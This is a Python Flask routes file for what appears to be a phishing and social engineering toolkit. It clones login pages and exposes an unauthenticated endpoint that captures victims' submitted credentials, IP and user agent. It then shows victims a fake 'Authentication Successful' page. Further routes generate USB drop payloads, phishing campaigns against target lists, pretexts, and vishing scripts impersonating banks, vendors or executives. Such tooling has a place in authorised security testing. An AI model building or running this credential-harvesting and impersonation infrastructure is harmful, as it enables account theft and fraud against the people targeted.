"""Social Engineering routes."""

from flask import Blueprint, request, jsonify, render_template, Response, redirect
from web.auth import login_required

social_eng_bp = Blueprint('social_eng', __name__, url_prefix='/social-eng')


def _get_toolkit():
    from modules.social_eng import get_social_eng
    return get_social_eng()


# ── Page ─────────────────────────────────────────────────────────────────────

@social_eng_bp.route('/')
@login_required
def index():
    return render_template('social_eng.html')


# ── Page Cloning ─────────────────────────────────────────────────────────────

@social_eng_bp.route('/clone', methods=['POST'])
@login_required
def clone_page():
    """Clone a login page."""
    data = request.get_json(silent=True) or {}
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'ok': False, 'error': 'URL required'})
    return jsonify(_get_toolkit().clone_page(url))


@social_eng_bp.route('/pages', methods=['GET'])
@login_required
def list_pages():
    """List all cloned pages."""
    return jsonify({'ok': True, 'pages': _get_toolkit().list_cloned_pages()})


@social_eng_bp.route('/pages/<page_id>', methods=['GET'])
@login_required
def get_page(page_id):
    """Get cloned page HTML content."""
    html = _get_toolkit().serve_cloned_page(page_id)
    if html is None:
        return jsonify({'ok': False, 'error': 'Page not found'})
    return jsonify({'ok': True, 'html': html, 'page_id': page_id})


@social_eng_bp.route('/pages/<page_id>', methods=['DELETE'])
@login_required
def delete_page(page_id):
    """Delete a cloned page."""
    if _get_toolkit().delete_cloned_page(page_id):
        return jsonify({'ok': True})
    return jsonify({'ok': False, 'error': 'Page not found'})


# ── Credential Capture (NO AUTH — accessed by phish targets) ─────────────────

@social_eng_bp.route('/capture/<page_id>', methods=['POST'])
def capture_creds(page_id):
    """Capture submitted credentials from a cloned page."""
    form_data = dict(request.form)
    entry = _get_toolkit().capture_creds(
        page_id,
        form_data,
        ip=request.remote_addr,
        user_agent=request.headers.get('User-Agent', ''),
    )
    # Show a generic success page to the victim
    return """<!DOCTYPE html><html><head><title>Success</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5}
.card{background:#fff;padding:40px;border-radius:8px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
</style></head><body><div class="card"><h2>Authentication Successful</h2>
<p>You will be redirected shortly...</p></div></body></html>"""


# ── Captures ─────────────────────────────────────────────────────────────────

@social_eng_bp.route('/captures', methods=['GET'])
@login_required
def get_captures():
    """Get captured credentials, optionally filtered by page_id."""
    page_id = request.args.get('page_id', '').strip()
    captures = _get_toolkit().get_captures(page_id or None)
    return jsonify({'ok': True, 'captures': captures})


@social_eng_bp.route('/captures', methods=['DELETE'])
@login_required
def clear_captures():
    """Clear captured credentials."""
    page_id = request.args.get('page_id', '').strip()
    count = _get_toolkit().clear_captures(page_id or None)
    return jsonify({'ok': True, 'cleared': count})


# ── QR Code ──────────────────────────────────────────────────────────────────

@social_eng_bp.route('/qr', methods=['POST'])
@login_required
def generate_qr():
    """Generate a QR code image."""
    data = request.get_json(silent=True) or {}
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'ok': False, 'error': 'URL required'})
    label = data.get('label', '').strip() or None
    size = int(data.get('size', 300))
    size = max(100, min(800, size))
    return jsonify(_get_toolkit().generate_qr(url, label=label, size=size))


# ── USB Payloads ─────────────────────────────────────────────────────────────

@social_eng_bp.route('/usb', methods=['POST'])
@login_required
def generate_usb():
    """Generate a USB drop payload."""
    data = request.get_json(silent=True) or {}
    payload_type = data.get('type', '').strip()
    if not payload_type:
        return jsonify({'ok': False, 'error': 'Payload type required'})
    params = data.get('params', {})
    return jsonify(_get_toolkit().generate_usb_payload(payload_type, params))


# ── Pretexts ─────────────────────────────────────────────────────────────────

@social_eng_bp.route('/pretexts', methods=['GET'])
@login_required
def get_pretexts():
    """List pretext templates, optionally filtered by category."""
    category = request.args.get('category', '').strip() or None
    pretexts = _get_toolkit().get_pretexts(category)
    return jsonify({'ok': True, 'pretexts': pretexts})


# ── Campaigns ────────────────────────────────────────────────────────────────

@social_eng_bp.route('/campaign', methods=['POST'])
@login_required
def create_campaign():
    """Create a new campaign."""
    data = request.get_json(silent=True) or {}
    name = data.get('name', '').strip()
    if not name:
        return jsonify({'ok': False, 'error': 'Campaign name required'})
    vector = data.get('vector', 'email').strip()
    targets = data.get('targets', [])
    if isinstance(targets, str):
        targets = [t.strip() for t in targets.split(',') if t.strip()]
    pretext = data.get('pretext', '').strip() or None
    campaign = _get_toolkit().create_campaign(name, vector, targets, pretext)
    return jsonify({'ok': True, 'campaign': campaign})


@social_eng_bp.route('/campaigns', methods=['GET'])
@login_required
def list_campaigns():
    """List all campaigns."""
    return jsonify({'ok': True, 'campaigns': _get_toolkit().list_campaigns()})


@social_eng_bp.route('/campaign/<campaign_id>', methods=['GET'])
@login_required
def get_campaign(campaign_id):
    """Get campaign details."""
    campaign = _get_toolkit().get_campaign(campaign_id)
    if not campaign:
        return jsonify({'ok': False, 'error': 'Campaign not found'})
    return jsonify({'ok': True, 'campaign': campaign})


@social_eng_bp.route('/campaign/<campaign_id>', methods=['DELETE'])
@login_required
def delete_campaign(campaign_id):
    """Delete a campaign."""
    if _get_toolkit().delete_campaign(campaign_id):
        return jsonify({'ok': True})
    return jsonify({'ok': False, 'error': 'Campaign not found'})


# ── Vishing ──────────────────────────────────────────────────────────────────

@social_eng_bp.route('/vishing', methods=['GET'])
@login_required
def list_vishing():
    """List available vishing scenarios."""
    return jsonify({'ok': True, 'scenarios': _get_toolkit().list_vishing_scenarios()})


@social_eng_bp.route('/vishing/<scenario>', methods=['GET'])
@login_required
def get_vishing_script(scenario):
    """Get a vishing script for a scenario."""
    target_info = {}
    for key in ('target_name', 'caller_name', 'phone', 'bank_name',
                'vendor_name', 'exec_name', 'exec_title', 'amount'):
        val = request.args.get(key, '').strip()
        if val:
            target_info[key] = val
    return jsonify(_get_toolkit().generate_vishing_script(scenario, target_info))


# ── Stats ────────────────────────────────────────────────────────────────────

@social_eng_bp.route('/stats', methods=['GET'])
@login_required
def get_stats():
    """Get overall statistics."""
    return jsonify({'ok': True, 'stats': _get_toolkit().get_stats()})
